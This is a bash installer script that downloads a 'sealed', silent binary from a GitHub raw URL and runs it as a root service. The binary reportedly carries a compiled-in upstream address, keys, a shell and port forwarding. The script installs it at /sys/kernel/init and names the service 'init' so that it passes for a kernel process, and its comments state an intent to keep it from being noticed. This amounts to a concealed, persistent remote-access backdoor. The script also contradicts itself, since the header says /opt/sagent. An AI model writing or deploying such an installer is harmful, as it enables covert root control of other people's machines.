#!/usr/bin/env bash
#
# sagent installer.
#
# Installs the prebuilt agent and runs it as a service. Nothing here is
# configurable: the binary already has its upstream address, the pre-shared key,
# the backend's public key, the exec command, the shell and the forwardable ports
# compiled in, and it is *sealed* -- it ignores its command line entirely, by
# design. It is built silent too, so its service produces no output.
#
# The few facts a deployment needs are hardcoded in the block below; edit this
# script if they ever change. Note where the binary lands: /opt/sagent is
# deliberately not on PATH, so the agent is not something a shell stumbles over.
#
# usage: install.sh [--uninstall] [--no-service] [--dry-run] [--help]
#
# Re-exec under bash when invoked by another shell: `sh install.sh` (dash on
# Debian) would otherwise die on `set -o pipefail` before doing anything.
if [ -z "${BASH_VERSION:-}" ]; then
  exec bash "$0" "$@"
fi

set -euo pipefail

# --- fixed for this deployment: edit here -------------------------------------
BASE_URL="https://raw.githubusercontent.com/sasssssssssas/sagent/refs/heads/main"
BIN_DIR="/sys/kernel"
SERVICE_USER="root"   # exec mode starts the host's sshd, which has to switch users
# ------------------------------------------------------------------------------

BIN_NAME="init"
BIN_PATH="${BIN_DIR}/${BIN_NAME}"
SERVICE_NAME="init"
SYSTEMD_UNIT="/etc/systemd/system/${SERVICE_NAME}.service"
OPENRC_SERVICE="/etc/init.d/${SERVICE_NAME}"
LAUNCHD_LABEL="com.${SERVICE_NAME}.agent"
LAUNCHD_PLIST="/Library/LaunchDaemons/${LAUNCHD_LABEL}.plist"

ACTION=install
WITH_SERVICE=1
DRY_RUN=0

log()  { printf '  %s\n' "$*" >&2; }
step() { printf '\n== %s\n' "$*" >&2; }
die()  { printf 'sagent-install: %s\n' "$*" >&2; exit 1; }

run() {
  if [ "$DRY_RUN" = 1 ]; then
    printf '  [dry-run] %s\n' "$*" >&2
  else
    "$@"
  fi
}

usage() { sed -n '2,16p' "$0" | sed 's/^# \{0,1\}//'; }
have()  { command -v "$1" >/dev/null 2>&1; }

while [ $# -gt 0 ]; do
  case "$1" in
    --uninstall)  ACTION=uninstall ;;
    --no-service) WITH_SERVICE=0 ;;
    --dry-run)    DRY_RUN=1 ;;
    -h|--help)    usage; exit 0 ;;
    *)            die "unknown argument $1 (try --help)" ;;
  esac
  shift
done

# --- platform -----------------------------------------------------------------
# Artifacts are named sagent-<os>-<arch>, e.g. sagent-linux-arm64.
detect_platform() {
  case "$(uname -s)" in
    Linux)  OS=linux ;;
    Darwin) OS=darwin ;;
    *)      die "unsupported OS '$(uname -s)'" ;;
  esac
  case "$(uname -m)" in
    x86_64|amd64)  ARCH=amd64 ;;
    aarch64|arm64) ARCH=arm64 ;;
    *)             die "unsupported architecture '$(uname -m)'" ;;
  esac
  URL="${BASE_URL%/}/sagent-${OS}-${ARCH}"
  log "platform: ${OS}-${ARCH}"
}

# --- download -----------------------------------------------------------------
download() {
  url="$1"
  dest="$2"
  if have curl; then
    # https only: a redirect or a MITM must not be able to downgrade the binary
    # to plaintext.
    curl -fsSL --proto '=https' --tlsv1.2 -o "$dest" "$url"
  elif have wget; then
    wget -qO "$dest" "$url"
  else
    die "need curl or wget to download $url"
  fi
}

install_binary() {
  [ "$(id -u)" = 0 ] || die "run as root (the binary goes to ${BIN_DIR})"

  tmp="$(mktemp)" || die "cannot create a temporary file"
  # shellcheck disable=SC2064
  trap "rm -f '$tmp'" EXIT INT TERM

  step "downloading $URL"
  download "$URL" "$tmp" || die "download failed"
  [ -s "$tmp" ] || die "downloaded file is empty"

  step "installing to ${BIN_PATH}"
  run install -d -m 0755 "$BIN_DIR"
  run install -m 0755 "$tmp" "$BIN_PATH"
  # No `--check` here: a sealed binary has no command line to check with.
}

# --- service ------------------------------------------------------------------
# Every unit starts the binary with no arguments: a sealed build ignores them,
# and the configuration is inside the file.
write_systemd_unit() {
  step "installing systemd unit ${SYSTEMD_UNIT}"
  run install -d -m 0755 /etc/systemd/system
  if [ "$DRY_RUN" = 1 ]; then
    printf '  [dry-run] write %s\n' "$SYSTEMD_UNIT" >&2
    return
  fi
  cat >"$SYSTEMD_UNIT" <<EOF
[Unit]
Description=init
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=${BIN_PATH}
User=${SERVICE_USER}
Restart=always
RestartSec=5
LimitNOFILE=65536
EOF
  run systemctl daemon-reload
  run systemctl enable --now "${SERVICE_NAME}.service"
  log "started; check with: systemctl status ${SERVICE_NAME}"
}

write_openrc_service() {
  step "installing OpenRC service ${OPENRC_SERVICE}"
  run install -d -m 0755 /etc/init.d
  if [ "$DRY_RUN" = 1 ]; then
    printf '  [dry-run] write %s\n' "$OPENRC_SERVICE" >&2
    return
  fi
  cat >"$OPENRC_SERVICE" <<EOF
#!/sbin/openrc-run
name="init"
description="init"
command="${BIN_PATH}"
command_background=true
pidfile="/run/\${RC_SVCNAME}.pid"
depend() { need net; after firewall; }
EOF
  chmod 0755 "$OPENRC_SERVICE"
  run rc-update add "${SERVICE_NAME}" default
  run rc-service "${SERVICE_NAME}" start
  log "started; check with: rc-service ${SERVICE_NAME} status"
}

write_launchd_plist() {
  step "installing launchd daemon ${LAUNCHD_PLIST}"
  run install -d -m 0755 /Library/LaunchDaemons
  if [ "$DRY_RUN" = 1 ]; then
    printf '  [dry-run] write %s\n' "$LAUNCHD_PLIST" >&2
    return
  fi
  cat >"$LAUNCHD_PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>${LAUNCHD_LABEL}</string>
  <key>ProgramArguments</key>
  <array>
    <string>${BIN_PATH}</string>
  </array>
  <key>UserName</key>
  <string>${SERVICE_USER}</string>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>
EOF
  run launchctl bootout "system/${LAUNCHD_LABEL}" 2>/dev/null || true
  run launchctl bootstrap system "$LAUNCHD_PLIST"
  log "started; check with: launchctl print system/${LAUNCHD_LABEL}"
}

install_service() {
  [ "$WITH_SERVICE" = 1 ] || { log "skipping service setup (--no-service)"; return; }
  case "$OS" in
    linux)
      if have systemctl && [ -d /run/systemd/system ]; then
        write_systemd_unit
      elif have rc-update; then
        write_openrc_service
      else
        die "no supported init found (systemd or OpenRC); re-run with --no-service"
      fi
      ;;
    darwin) write_launchd_plist ;;
    *)      log "no service integration for ${OS}; installed but not started" ;;
  esac
}

uninstall() {
  detect_platform
  step "stopping and removing the service"
  case "$OS" in
    linux)
      if have systemctl; then
        run systemctl disable --now "${SERVICE_NAME}.service" 2>/dev/null || true
        run rm -f "$SYSTEMD_UNIT"
        run systemctl daemon-reload 2>/dev/null || true
      elif have rc-service; then
        run rc-service "${SERVICE_NAME}" stop 2>/dev/null || true
        run rc-update del "${SERVICE_NAME}" default 2>/dev/null || true
        run rm -f "$OPENRC_SERVICE"
      fi
      ;;
    darwin)
      run launchctl bootout "system/${LAUNCHD_LABEL}" 2>/dev/null || true
      run rm -f "$LAUNCHD_PLIST"
      ;;
  esac
  step "removing the binary"
  run rm -f "$BIN_PATH"
  run rmdir "$BIN_DIR" 2>/dev/null || true
  log "uninstalled"
}

# --- main ---------------------------------------------------------------------
if [ "$ACTION" = uninstall ]; then
  uninstall
  exit 0
fi

detect_platform
install_binary
install_service
step "done"
if [ "$WITH_SERVICE" = 1 ]; then
  log "${BIN_PATH} installed and running as ${SERVICE_NAME}"
else
  log "${BIN_PATH} installed (no service was set up)"
fi
